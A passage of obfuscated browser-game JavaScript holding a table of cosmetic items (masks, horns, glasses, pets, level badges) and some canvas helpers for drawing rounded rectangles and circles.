					"ᐃΔⵠ": ⵠ[183],
					name: "Sunglasses 2"
				}, {
					id: 28,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆⲆⲆⲆᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⵠⵠᐃⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Starfish"
				}, {
					id: 37,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⲆⵠᐃⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ⲆΔⲆⵠⵠᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Berry"
				}, {
					id: 39,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⲆⵠⲆΔⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃⵠⵠⲆⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Flake"
				}, {
					id: 43,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⵠᐃᐃⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ΔⲆᐃᐃᐃⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Leaf "
				}, {
					id: 61,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆᐃⲆⲆᐃΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆⲆⵠⲆΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "A sword in your head"
				}, {
					id: 62,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠⵠᐃΔΔⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆᐃⲆⲆⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Winter Scarf"
				}, {
					id: 64,
					"ᐃΔⲆ": ⲆΔ.ΔⲆΔᐃⵠᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ΔⲆⲆΔⲆΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Winter Scarf 2"
				}, {
					id: 66,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⵠⲆⵠⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆⲆΔⵠᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Winter Scarf 3"
				}, {
					id: 70,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃΔⲆⵠⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ΔⲆᐃⲆⲆⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Mask with animal tracks"
				}, {
					id: 71,
					"ᐃΔⲆ": ⲆΔ.ΔⲆⲆⵠΔΔΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠᐃⵠΔΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Spring Mask"
				}, {
					id: 72,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠⲆΔΔΔⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠΔᐃΔⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Pink Mask"
				}, {
					id: 73,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆⵠΔᐃⵠΔ,
					"ΔΔᐃ": ⲆΔ.ΔⵠᐃⲆΔΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Blue Mask"
				}, {
					id: 76,
					"ᐃΔⲆ": ⲆΔ.ΔⲆΔΔᐃⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆᐃⲆΔⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Military Mask"
				}, {
					id: 77,
					"ᐃΔⲆ": ⲆΔ.ⲆΔΔᐃΔⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ΔᐃΔⲆⲆᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Orange Mask"
				}, {
					id: 78,
					"ᐃΔⲆ": ⲆΔ.ΔⲆᐃⵠΔⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ΔᐃᐃⲆΔⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "White and Red Points Mask"
				}, {
					id: 80,
					"ᐃΔⲆ": ⲆΔ.ΔΔⲆΔΔΔⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠⵠΔⵠᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Stick out your tongue Mask"
				}, {
					id: 81,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠⵠΔⲆⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ΔᐃⲆⵠⵠⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Two Teeth Mask"
				}, {
					id: 82,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠᐃᐃⲆⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⲆᐃⲆⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Make-up Mask"
				}, {
					id: 83,
					"ᐃΔⲆ": ⲆΔ.ⵠΔΔΔⵠⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠΔᐃΔⵠᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Sad Mask"
				}, {
					id: 84,
					"ᐃΔⲆ": ⲆΔ.ᐃΔΔⵠΔᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ΔⲆΔⵠᐃᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Happy Mask"
				}, {
					id: 90,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⵠⲆⵠᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆᐃⵠⵠⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[427],
					name: "Blood"
				}, {
					id: 101,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⲆᐃⵠⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠⵠᐃᐃⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Axed Plans"
				}, {
					id: 105,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆᐃⵠⵠᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ΔᐃⲆΔᐃⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Saddle"
				}, {
					id: 113,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆᐃⲆᐃᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠᐃᐃⲆᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "I see"
				}, {
					id: 114,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⵠⵠΔΔⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠΔⵠᐃⵠᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "I have no body and I must dress"
				}, {
					id: 115,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆᐃᐃΔᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ΔⵠⵠΔΔⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Cursed Crown"
				}, {
					id: 27,
					"ᐃΔⲆ": ⲆΔ.ΔᐃΔᐃᐃᐃΔ,
					"ΔΔᐃ": ⲆΔ.ΔⲆⵠᐃΔΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Clown Face"
				}, {
					id: 20,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠᐃΔⵠΔⲆ,
					"ΔΔᐃ": ⲆΔ.ΔⵠⲆΔΔⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Sunglasses 3"
				}, {
					id: 32,
					"ᐃΔⲆ": ⲆΔ.Δᐃⵠⵠᐃᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆΔΔⵠⵠⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Engineer's Glasses"
				}, {
					id: 33,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⲆⵠⲆᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ΔΔⵠⵠⲆᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Engineer's Monocle"
				}, {
					id: 34,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⵠΔΔⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆΔᐃⵠⲆΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Mauve's butt"
				}, {
					id: 41,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⲆΔⵠᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠΔΔⵠⵠΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Lapa Head"
				}, {
					id: 42,
					"ᐃΔⲆ": ⲆΔ.ΔΔΔⵠⵠᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ΔΔᐃᐃΔᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Lapa Head "
				}, {
					id: 85,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃᐃΔΔᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠⲆⲆⲆΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Mask and Glasses"
				}, {
					id: 110,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠᐃᐃⵠΔΔ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆᐃⵠᐃΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Tamon Spectrum Pet"
				}, {
					id: 60,
					"ᐃΔⲆ": ⲆΔ.ΔᐃᐃⲆⵠⵠΔ,
					"ΔΔᐃ": ⲆΔ.ᐃΔⲆⵠΔᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Jason"
				}, {
					id: 26,
					"ᐃΔⲆ": ⲆΔ.ΔΔΔΔᐃᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠⲆΔⲆⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Devil Horns"
				}, {
					id: ΔⲆΔⲆⲆᐃⲆ,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠⵠⵠΔⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠᐃΔᐃⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Big Boss"
				}, {
					id: 35,
					"ᐃΔⲆ": ⲆΔ.ΔⵠⵠⲆᐃⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠΔᐃⵠⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Baby Kraken"
				}, {
					id: 63,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⲆΔⵠⵠΔ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠⵠΔⲆⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Deer Antlers"
				}, {
					id: 65,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆᐃⲆⵠᐃⲆ,
					"ΔΔᐃ": ⲆΔ.Δⵠⵠᐃⵠⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Baby Dragon on your head"
				}, {
					id: 86,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⲆᐃⵠΔⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆⲆΔⵠΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Gaz Mask and Glasses"
				}, {
					id: 87,
					"ᐃΔⲆ": ⲆΔ.ⲆΔᐃᐃᐃⵠΔ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃⲆⵠΔΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Pink Gaz Mask and Glasses"
				}, {
					id: 88,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆⲆᐃⵠⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠΔⲆᐃⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Engineer Glasses"
				}, {
					id: 97,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⵠΔᐃᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃΔⵠⲆⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Jarred Horns"
				}, {
					id: 98,
					"ᐃΔⲆ": ⲆΔ.ΔⵠⲆⲆⲆⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃⵠᐃΔⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Curved Horns"
				}, {
					id: 99,
					"ᐃΔⲆ": ⲆΔ.ΔⵠᐃΔΔᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃᐃⵠⲆⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Evil Goat Horns"
				}, {
					id: 107,
					"ᐃΔⲆ": ⲆΔ.ⵠΔⵠΔⵠᐃΔ,
					"ΔΔᐃ": ⲆΔ.ⵠΔⵠᐃᐃⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Decorative Earmuffs"
				}, {
					id: 112,
					"ᐃΔⲆ": ⲆΔ.ΔⲆⲆⲆⵠᐃΔ,
					"ΔΔᐃ": ⲆΔ.ΔⲆⲆⵠⲆΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Tamon Dragon Pet"
				}, {
					id: 116,
					"ᐃΔⲆ": ⲆΔ.ᐃΔⵠᐃᐃⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠΔΔⲆⲆⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆΔᐃᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Blanket"
				}, {
					id: 45,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠⲆⲆⲆⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃΔΔᐃⵠΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆᐃΔᐃⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "More than Level 5",
					level: ⲆⲆΔⵠ
				}, {
					id: 46,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠⲆⵠΔᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠⲆΔⲆΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆᐃΔᐃⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "More than Level 10",
					level: ⲆⵠⲆⵠⲆ
				}, {
					id: 47,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃΔΔⵠⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ΔⲆⲆⲆΔᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆᐃΔᐃⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "More than Level 15",
					level: ᐃΔⲆᐃᐃΔᐃ
				}, {
					id: 48,
					"ᐃΔⲆ": ⲆΔ.ⲆΔΔΔᐃⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ⲆΔΔΔᐃΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆᐃΔᐃⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "More than Level 20",
					level: Δⵠᐃᐃᐃ
				}, {
					id: 49,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⵠⵠᐃΔⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃΔΔᐃΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆᐃΔᐃⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "More than Level 25",
					level: 25
				}, {
					id: 50,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⲆΔⵠᐃΔ,
					"ΔΔᐃ": ⲆΔ.ΔⲆΔᐃᐃⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆᐃΔᐃⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "More than Level 30",
					level: 30
				}, {
					id: 51,
					"ᐃΔⲆ": ⲆΔ.ᐃΔΔᐃⲆⲆΔ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃⲆᐃⵠᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆᐃΔᐃⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "More than Level 35",
					level: 35
				}, {
					id: 52,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⵠⲆⲆΔⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃΔⲆⲆⵠⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆᐃΔᐃⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "More than Level 40",
					level: 40
				}, {
					id: 53,
					"ᐃΔⲆ": ⲆΔ.ΔΔⲆᐃⲆΔᐃ,
					"ΔΔᐃ": ⲆΔ.ΔᐃᐃΔⲆΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆᐃΔᐃⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "More than Level 45",
					level: 45
				}, {
					id: 54,
					"ᐃΔⲆ": ⲆΔ.ⲆΔᐃᐃΔⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠⲆΔᐃΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆᐃΔᐃⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "More than Level 50",
					level: 50
				}, {
					id: 55,
					"ᐃΔⲆ": ⲆΔ.ΔⲆⲆⵠΔⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆⵠΔᐃΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆᐃΔᐃⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "More than Level 55",
					level: 55
				}, {
					id: 56,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆΔΔΔⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠᐃΔᐃⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆᐃΔᐃⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "More than Level 60",
					level: 60
				}]
			};
			ΔᐃᐃΔ.ⲆᐃⵠΔᐃⲆΔ = ⵠⲆᐃⵠΔΔⵠ(ᐃⲆⵠⲆ.ᐃⵠⲆⲆᐃ, 21);
			ΔᐃᐃΔ.ⵠΔⵠΔᐃⵠⲆ = ⵠⲆᐃⵠΔΔⵠ(ᐃⲆⵠⲆ.ᐃⵠⲆⲆᐃ, 20);
			ⵠⲆ[Ⲇ.Δᐃⵠᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆᐃΔᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⲆΔᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠⲆⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆᐃᐃᐃ] = [];
			for (var ⵠᐃ = ΔⲆⵠⲆ; ᐃⲆⵠⲆ.ᐃⵠⲆⲆᐃ.length > ⵠᐃ; ⵠᐃ++) {
				ⵠⲆ[Ⲇ.Δᐃⵠᐃᐃ][ⵠᐃ] = [ᐃⲆⵠⲆ.ᐃⵠⲆⲆᐃ[ⵠᐃ].ᐃΔⲆ, ᐃⲆⵠⲆ.ᐃⵠⲆⲆᐃ[ⵠᐃ].ΔΔᐃ];
				ⵠⲆ[Ⲇ.ᐃⲆᐃΔᐃ][ⵠᐃ] = [ᐃⲆⵠⲆ.ᐃⵠⲆⲆᐃ[ⵠᐃ].ΔᐃⲆⲆ, ᐃⲆⵠⲆ.ᐃⵠⲆⲆᐃ[ⵠᐃ].ᐃⵠΔᐃ]
			}
			for (var ⵠᐃ = ⵠΔⲆⵠ; ⵠᐃ < ᐃⲆⵠⲆ.ⵠⵠⲆⵠⲆ.length; ⵠᐃ++) ⵠⲆ[Ⲇ.ⵠⵠⲆⵠⲆ][ⵠᐃ] = [ᐃⲆⵠⲆ.ⵠⵠⲆⵠⲆ[ⵠᐃ].ᐃΔⲆ, ᐃⲆⵠⲆ.ⵠⵠⲆⵠⲆ[ⵠᐃ].ΔΔᐃ];
			for (var ⵠᐃ = ᐃⵠΔ; ᐃⲆⵠⲆ.ⲆᐃⲆΔᐃ.length > ⵠᐃ; ⵠᐃ++) ⵠⲆ[Ⲇ.ⲆᐃⲆΔᐃ][ⵠᐃ] = [ᐃⲆⵠⲆ.ⲆᐃⲆΔᐃ[ⵠᐃ].ᐃΔⲆ, ᐃⲆⵠⲆ.ⲆᐃⲆΔᐃ[ⵠᐃ].ΔΔᐃ];
			for (var ⵠᐃ = ⲆΔⵠ; ⵠᐃ < ᐃⲆⵠⲆ.ⵠᐃᐃⵠ.length; ⵠᐃ++) ⵠⲆ[Ⲇ.ⵠᐃᐃⵠ][ⵠᐃ] = [ᐃⲆⵠⲆ.ⵠᐃᐃⵠ[ⵠᐃ].ᐃΔⲆ, ᐃⲆⵠⲆ.ⵠᐃᐃⵠ[ⵠᐃ].ΔΔᐃ];
			for (var ⵠᐃ = ⲆΔⵠ; ᐃⲆⵠⲆ.ⲆⲆᐃᐃᐃ.length > ⵠᐃ; ⵠᐃ++) ⵠⲆ[Ⲇ.ⲆⲆᐃᐃᐃ][ⵠᐃ] = [ᐃⲆⵠⲆ.ⲆⲆᐃᐃᐃ[ⵠᐃ].ᐃΔⲆ, ᐃⲆⵠⲆ.ⲆⲆᐃᐃᐃ[ⵠᐃ].ΔΔᐃ]
		};

		function ΔⲆ(Δ, ᐃⲆⵠⲆᐃ, ⵠΔⲆⲆ, ⵠⲆⵠ) {
			ᐃⲆⵠⲆᐃ && (Δ.fillStyle = ᐃⲆⵠⲆᐃ, Δ.fill());
			ⵠΔⲆⲆ && (Δ.lineWidth = ⵠⲆⵠ, Δ.strokeStyle = ⵠΔⲆⲆ, Δ.stroke())
		}
		const ⲆΔⵠⲆΔ = ΔᐃᐃⲆⲆ;

		function ᐃᐃⲆⵠᐃⲆΔⲆⵠ(Δ, ⲆⲆᐃⲆ, ⲆᐃΔⲆ, Δⵠⵠᐃ, ⲆΔᐃⲆ, ⵠΔⵠⵠ) {
			ⵠΔⵠⵠ * 2 > Δⵠⵠᐃ && (ⵠΔⵠⵠ = Δⵠⵠᐃ / 2);
			ⵠΔⵠⵠ * 2 > ⲆΔᐃⲆ && (ⵠΔⵠⵠ = ⲆΔᐃⲆ / 2);
			ΔⲆⲆ > ⵠΔⵠⵠ && (ⵠΔⵠⵠ = ⵠⲆᐃⵠ);
			Δ.beginPath();
			Δ.moveTo(ⲆⲆᐃⲆ + ⵠΔⵠⵠ, ⲆᐃΔⲆ);
			Δ.arcTo(ⲆⲆᐃⲆ + Δⵠⵠᐃ, ⲆᐃΔⲆ, ⲆⲆᐃⲆ + Δⵠⵠᐃ, ⲆᐃΔⲆ + ⲆΔᐃⲆ, 0);
			Δ.arcTo(ⲆⲆᐃⲆ + Δⵠⵠᐃ, ⲆᐃΔⲆ + ⲆΔᐃⲆ, ⲆⲆᐃⲆ, ⲆᐃΔⲆ + ⲆΔᐃⲆ, ⵠΔⵠⵠ);
			Δ.arcTo(ⲆⲆᐃⲆ, ⲆᐃΔⲆ + ⲆΔᐃⲆ, ⲆⲆᐃⲆ, ⲆᐃΔⲆ, ⲆΔⵠ);
			Δ.arcTo(ⲆⲆᐃⲆ, ⲆᐃΔⲆ, ⲆⲆᐃⲆ + Δⵠⵠᐃ, ⲆᐃΔⲆ, ⵠΔⵠⵠ);
			Δ.closePath()
		}

		function Ⲇᐃᐃ(Δ, ⲆⲆᐃⲆ, ⲆᐃΔⲆ, Δⵠⵠᐃ, ⲆΔᐃⲆ, ⵠΔⵠⵠ) {
			2 * ⵠΔⵠⵠ > Δⵠⵠᐃ && (ⵠΔⵠⵠ = Δⵠⵠᐃ / ΔⲆΔΔΔ);
			ⵠΔⵠⵠ * 2 > ⲆΔᐃⲆ && (ⵠΔⵠⵠ = ⲆΔᐃⲆ / 2);
			0 > ⵠΔⵠⵠ && (ⵠΔⵠⵠ = 0);
			Δ.beginPath();
			Δ.moveTo(ⲆⲆᐃⲆ + ⵠΔⵠⵠ, ⲆᐃΔⲆ);
			Δ.arcTo(ⲆⲆᐃⲆ + Δⵠⵠᐃ, ⲆᐃΔⲆ, ⲆⲆᐃⲆ + Δⵠⵠᐃ, ⲆᐃΔⲆ + ⲆΔᐃⲆ, ⵠΔⵠⵠ);
			Δ.arcTo(ⲆⲆᐃⲆ + Δⵠⵠᐃ, ⲆᐃΔⲆ + ⲆΔᐃⲆ, ⲆⲆᐃⲆ, ⲆᐃΔⲆ + ⲆΔᐃⲆ, ⵠΔⵠⵠ);
			Δ.arcTo(ⲆⲆᐃⲆ, ⲆᐃΔⲆ + ⲆΔᐃⲆ, ⲆⲆᐃⲆ, ⲆᐃΔⲆ, ⵠΔⵠⵠ);
			Δ.arcTo(ⲆⲆᐃⲆ, ⲆᐃΔⲆ, ⲆⲆᐃⲆ + Δⵠⵠᐃ, ⲆᐃΔⲆ, ⵠΔⵠⵠ);
			Δ.closePath()
		}

		function ⵠᐃᐃ(Δ, Δⵠ, ⲆⵠⲆ, ⲆⲆⵠ) {
			Δ.beginPath();
			Δ.arc(Δⵠ, ⲆⵠⲆ, ⲆⲆⵠ, ΔⲆⲆ, 2 * Math.PI)
		}
		const ΔⵠⵠΔ = Δᐃⵠⵠ;

		function ⲆΔⵠᐃⵠⵠⲆᐃⵠ(ᐃ, Ⲇᐃ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 120;
			Ⲇⵠ.height = ᐃ * 110;
			if (Ⲇᐃⵠ == ⵠᐃ) {
				ⵠᐃᐃ(Δ, ᐃ * 35, 75 * ᐃ, ᐃ * 19.72308292331602);
				ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[0], Ⲇᐃⵠᐃ * ᐃ);
